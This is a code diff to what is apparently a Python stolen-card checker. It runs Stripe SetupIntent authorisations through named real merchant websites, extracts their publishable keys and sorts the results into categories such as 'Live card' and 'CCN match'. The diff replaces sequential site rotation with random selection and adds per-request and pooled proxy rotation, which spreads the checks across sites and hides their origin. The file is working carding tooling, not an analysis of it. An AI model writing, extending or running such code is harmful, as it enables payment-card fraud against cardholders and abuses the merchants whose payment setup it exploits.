@@ -10,13 +10,12 @@ Supported Target Sites:
 4. Odin Water Polo (odinwaterpolo.com)
 5. Noble Rot (noble-rot.newsstand.co.uk)
 
-Response Types:
-1. APPROVED / SUCCEEDED (Card valid, SetupIntent passed) -> status: 'approved', code: 'succeeded'
-2. INSUFFICIENT FUNDS (Kam balance / Live card) -> status: 'declined', code: 'insufficient_funds'
-3. INCORRECT CVC / CVV (CCN match / Live card) -> status: 'declined', code: 'incorrect_cvc'
-4. EXPIRED CARD (Card expired) -> status: 'declined', code: 'expired_card'
-5. 3DS REQUIRED (OTP / Authentication) -> status: 'requires_action', code: '3ds_required'
-6. DO NOT HONOR / DECLINED (General bank decline) -> status: 'declined', code: 'do_not_honor' / 'card_declined'
+Features:
+- Pure Random Site Selection on every call (or manual via ?site=...)
+- Includes 'gateway' and 'gateway_name' in all JSON/Text responses
+- Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
+- Dynamic proxy pool with auto-rotation
+- Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
 """
 
 import re
@@ -87,8 +86,6 @@ SITES_CONFIG = [
         "active": True
     }
 ]
-
-site_rotation_index = 0
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFIER
@@ -197,11 +194,10 @@ class ProxyManager:
 proxy_manager = ProxyManager()
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SITE SELECTOR & KEY EXTRACTOR
+# SITE SELECTOR & KEY EXTRACTOR (RANDOMIZED ROTATION)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def get_site_config(requested_site=None):
-    global site_rotation_index
     if requested_site:
         req = str(requested_site).lower().strip()
         for s in SITES_CONFIG:
@@ -212,12 +208,11 @@ def get_site_config(requested_site=None):
             if 0 <= idx < len(SITES_CONFIG):
                 return SITES_CONFIG[idx]
 
+    # Pick purely RANDOM active site on every call
     active_sites = [s for s in SITES_CONFIG if s.get("active", True)]
     if not active_sites:
         active_sites = SITES_CONFIG
-    site = active_sites[site_rotation_index % len(active_sites)]
-    site_rotation_index += 1
-    return site
+    return random.choice(active_sites)
 
 async def extract_dynamic_stripe_key(session: httpx.AsyncClient, site: dict) -> str:
     if site.get("key"):
@@ -265,6 +260,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         if len(mm) == 1:
             mm = '0' + mm
 
+        # Proxy resolution: 1st preference is query param, 2nd is pool rotator
         proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
         site = get_site_config(site_param)
         domain = site["domain"]
